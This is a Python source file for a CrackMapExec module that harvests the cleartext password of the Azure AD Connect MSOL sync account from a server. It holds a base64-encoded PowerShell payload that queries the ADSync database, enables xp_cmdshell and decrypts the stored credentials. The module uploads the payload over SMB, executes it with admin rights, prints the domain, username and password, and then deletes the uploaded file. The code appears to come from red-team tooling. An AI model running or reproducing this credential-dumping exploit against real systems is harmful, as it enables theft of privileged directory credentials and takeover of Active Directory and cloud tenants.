# MSOL module for CME 
# Author of the module : https://twitter.com/Daahtk
# Based on the article : https://blog.xpnsec.com/azuread-connect-for-redteam/

from base64 import b64decode
from sys import exit
from os import path

class CMEModule:

   name = 'msol'
   description = 'Dump MSOL cleartext password from the localDB on the Azure AD-Connect server'
   supported_protocols = ['smb']
   opsec_safe = True 
   multiple_hosts = True

   def options(self, context, module_options):
       '''
           MSOL_PS1   // Path to the msol binary on your computer
       '''

       self.tmp_dir = "C:\\Windows\\Temp\\"
       self.share = "C$"
       self.tmp_share = self.tmp_dir.split(":")[1]
       self.msol = "msol.ps1"
       self.useembeded = True
       self.token = self.cmd = ""
       self.msol_embedded =b64decode('JGRiPUAoQzpcIlByb2dyYW0gRmlsZXMiXCJNaWNyb3NvZnQgU1FMIFNlcnZlciJcMTUwXFRvb2xzXEJpbm5cU3FsTG9jYWxEQi5leGUgaW5mbyB8IGZpbmRzdHIgL2kgQURTeSkKCiRjbGllbnQgPSBuZXctb2JqZWN0IFN5c3RlbS5EYXRhLlNxbENsaWVudC5TcWxDb25uZWN0aW9uIC1Bcmd1bWVudExpc3QgIkRhdGEgU291cmNlPShsb2NhbGRiKVwkZGI7SW5pdGlhbCBDYXRhbG9nPUFEU3luYyIKCnRyeSB7CiAgICAkY2xpZW50Lk9wZW4oKQp9IGNhdGNoIHsKICAgIFdyaXRlLUhvc3QgIlshXSBDb3VsZCBub3QgY29ubmVjdCB0byBsb2NhbGRiLi4uIgogICAgcmV0dXJuCn0KCldyaXRlLUhvc3QgIlsqXSBRdWVyeWluZyBBRFN5bmMgbG9jYWxkYiAobW1zX3NlcnZlcl9jb25maWd1cmF0aW9uKSIKCiRjbWQgPSAkY2xpZW50LkNyZWF0ZUNvbW1hbmQoKQokY21kLkNvbW1hbmRUZXh0ID0gIlNFTEVDVCBrZXlzZXRfaWQsIGluc3RhbmNlX2lkLCBlbnRyb3B5IEZST00gbW1zX3NlcnZlcl9jb25maWd1cmF0aW9uIgokcmVhZGVyID0gJGNtZC5FeGVjdXRlUmVhZGVyKCkKaWYgKCRyZWFkZXIuUmVhZCgpIC1uZSAkdHJ1ZSkgewogICAgV3JpdGUtSG9zdCAiWyFdIEVycm9yIHF1ZXJ5aW5nIG1tc19zZXJ2ZXJfY29uZmlndXJhdGlvbiIKICAgIHJldHVybgp9Cgoka2V5X2lkID0gJHJlYWRlci5HZXRJbnQzMigwKQokaW5zdGFuY2VfaWQgPSAkcmVhZGVyLkdldEd1aWQoMSkKJGVudHJvcHkgPSAkcmVhZGVyLkdldEd1aWQoMikKJHJlYWRlci5DbG9zZSgpCgpXcml0ZS1Ib3N0ICJbKl0gUXVlcnlpbmcgQURTeW5jIGxvY2FsZGIgKG1tc19tYW5hZ2VtZW50X2FnZW50KSIKCiRjbWQgPSAkY2xpZW50LkNyZWF0ZUNvbW1hbmQoKQokY21kLkNvbW1hbmRUZXh0ID0gIlNFTEVDVCBwcml2YXRlX2NvbmZpZ3VyYXRpb25feG1sLCBlbmNyeXB0ZWRfY29uZmlndXJhdGlvbiBGUk9NIG1tc19tYW5hZ2VtZW50X2FnZW50IFdIRVJFIG1hX3R5cGUgPSAnQUQnIgokcmVhZGVyID0gJGNtZC5FeGVjdXRlUmVhZGVyKCkKaWYgKCRyZWFkZXIuUmVhZCgpIC1uZSAkdHJ1ZSkgewogICAgV3JpdGUtSG9zdCAiWyFdIEVycm9yIHF1ZXJ5aW5nIG1tc19tYW5hZ2VtZW50X2FnZW50IgogICAgcmV0dXJuCn0KCiRjb25maWcgPSAkcmVhZGVyLkdldFN0cmluZygwKQokY3J5cHRlZCA9ICRyZWFkZXIuR2V0U3RyaW5nKDEpCiRyZWFkZXIuQ2xvc2UoKQoKV3JpdGUtSG9zdCAiWypdIFVzaW5nIHhwX2NtZHNoZWxsIHRvIHJ1biBzb21lIFBvd2Vyc2hlbGwgYXMgdGhlIHNlcnZpY2UgdXNlciIKCiRjbWQgPSAkY2xpZW50LkNyZWF0ZUNvbW1hbmQoKQokY21kLkNvbW1hbmRUZXh0ID0gIkVYRUMgc3BfY29uZmlndXJlICdzaG93IGFkdmFuY2VkIG9wdGlvbnMnLCAxOyBSRUNPTkZJR1VSRTsgRVhFQyBzcF9jb25maWd1cmUgJ3hwX2NtZHNoZWxsJywgMTsgUkVDT05GSUdVUkU7IEVYRUMgeHBfY21kc2hlbGwgJ3Bvd2Vyc2hlbGwuZXhlIC1jIGAiYWRkLXR5cGUgLXBhdGggJydDOlxQcm9ncmFtIEZpbGVzXE1pY3Jvc29mdCBBenVyZSBBRCBTeW5jXEJpblxtY3J5cHQuZGxsJyc7YCRrbSA9IE5ldy1PYmplY3QgLVR5cGVOYW1lIE1pY3Jvc29mdC5EaXJlY3RvcnlTZXJ2aWNlcy5NZXRhZGlyZWN0b3J5U2VydmljZXMuQ3J5cHRvZ3JhcGh5LktleU1hbmFnZXI7YCRrbS5Mb2FkS2V5U2V0KFtndWlkXScnJGVudHJvcHknJywgW2d1aWRdJyckaW5zdGFuY2VfaWQnJywgJGtleV9pZCk7YCRrZXkgPSBgJG51bGw7YCRrbS5HZXRBY3RpdmVDcmVkZW50aWFsS2V5KFtyZWZdYCRrZXkpO2Aka2V5MiA9IGAkbnVsbDtgJGttLkdldEtleSgxLCBbcmVmXWAka2V5Mik7YCRkZWNyeXB0ZWQgPSBgJG51bGw7YCRrZXkyLkRlY3J5cHRCYXNlNjRUb1N0cmluZygnJyRjcnlwdGVkJycsIFtyZWZdYCRkZWNyeXB0ZWQpO1dyaXRlLUhvc3QgYCRkZWNyeXB0ZWRgIiciCiRyZWFkZXIgPSAkY21kLkV4ZWN1dGVSZWFkZXIoKQoKJGRlY3J5cHRlZCA9IFtzdHJpbmddOjpFbXB0eQoKd2hpbGUgKCRyZWFkZXIuUmVhZCgpIC1lcSAkdHJ1ZSAtYW5kICRyZWFkZXIuSXNEQk51bGwoMCkgLWVxICRmYWxzZSkgewogICAgJGRlY3J5cHRlZCArPSAkcmVhZGVyLkdldFN0cmluZygwKQp9CgppZiAoJGRlY3J5cHRlZCAtZXEgW3N0cmluZ106OkVtcHR5KSB7CiAgICBXcml0ZS1Ib3N0ICJbIV0gRXJyb3IgdXNpbmcgeHBfY21kc2hlbGwgdG8gbGF1bmNoIG91ciBkZWNyeXB0aW9uIHBvd2Vyc2hlbGwiCiAgICByZXR1cm4KfQoKJGRvbWFpbiA9IHNlbGVjdC14bWwgLUNvbnRlbnQgJGNvbmZpZyAtWFBhdGggIi8vcGFyYW1ldGVyW0BuYW1lPSdmb3Jlc3QtbG9naW4tZG9tYWluJ10iIHwgc2VsZWN0IEB7TmFtZSA9ICdEb21haW4nOyBFeHByZXNzaW9uID0geyRfLm5vZGUuSW5uZXJUZXh0fX0KJHVzZXJuYW1lID0gc2VsZWN0LXhtbCAtQ29udGVudCAkY29uZmlnIC1YUGF0aCAiLy9wYXJhbWV0ZXJbQG5hbWU9J2ZvcmVzdC1sb2dpbi11c2VyJ10iIHwgc2VsZWN0IEB7TmFtZSA9ICdVc2VybmFtZSc7IEV4cHJlc3Npb24gPSB7JF8ubm9kZS5Jbm5lclRleHR9fQokcGFzc3dvcmQgPSBzZWxlY3QteG1sIC1Db250ZW50ICRkZWNyeXB0ZWQgLVhQYXRoICIvL2F0dHJpYnV0ZSIgfCBzZWxlY3QgQHtOYW1lID0gJ1Bhc3N3b3JkJzsgRXhwcmVzc2lvbiA9IHskXy5ub2RlLklubmVyVGV4dH19CgpXcml0ZS1Ib3N0ICJEb21haW46ICQoJGRvbWFpbi5Eb21haW4pIgpXcml0ZS1Ib3N0ICJVc2VybmFtZTogJCgkdXNlcm5hbWUuVXNlcm5hbWUpIgpXcml0ZS1Ib3N0ICJQYXNzd29yZDogJCgkcGFzc3dvcmQuUGFzc3dvcmQpIgo=')

       if "MSOL_PS1" in module_options:
           self.MSOL_PS1 = module_options["MSOL_PS1"]
           self.useembeded = False


   def execscript(self, _, connection):
        command = f"C:\\windows\\system32\\WindowsPowershell\\v1.0\\powershell.exe {self.tmp_dir}msol.ps1"
        return connection.execute(command, True)
        
   def on_admin_login(self, context, connection):

        if self.useembeded:
            file_to_upload = "/tmp/msol.ps1"
            with open(file_to_upload, 'wb') as msol:
                msol.write(self.msol_embedded)
        else:
            if path.isfile(self.MSOL_PS1):
               file_to_upload = self.MSOL_PS1
            else:
               context.log.error(f"Cannot open {self.MSOL_PS1}")
               exit(1)

        context.log.info(f"Uploading {self.msol}")
        with open(file_to_upload, 'rb') as msol:
            try:
               connection.conn.putFile(self.share, f"{self.tmp_share}{self.msol}", msol.read)
               context.log.success(f"Msol script successfully uploaded")
            except Exception as e:
               context.log.error(f"Error writing file to share {self.tmp_share}: {e}")
               return
               
        try:
            if self.cmd == "":
                context.log.info(f"Executing the script")
                p = self.execscript(context, connection)
                for line in p.splitlines():
                    p1, p2 = line.split(" ", 1)
                    context.log.highlight(f"{p1} {p2}")
            else :
                context.log.error(f"Script Execution Impossible")
                
        except Exception as e:
            context.log.error(f"Error runing command: {e}")
        finally:
            try:
                connection.conn.deleteFile(self.share, f"{self.tmp_share}{self.msol}")
                context.log.success(f"Msol script successfully deleted")
            except Exception as e:
                context.log.error(f"Error deleting msol script on {self.share}: {e}")
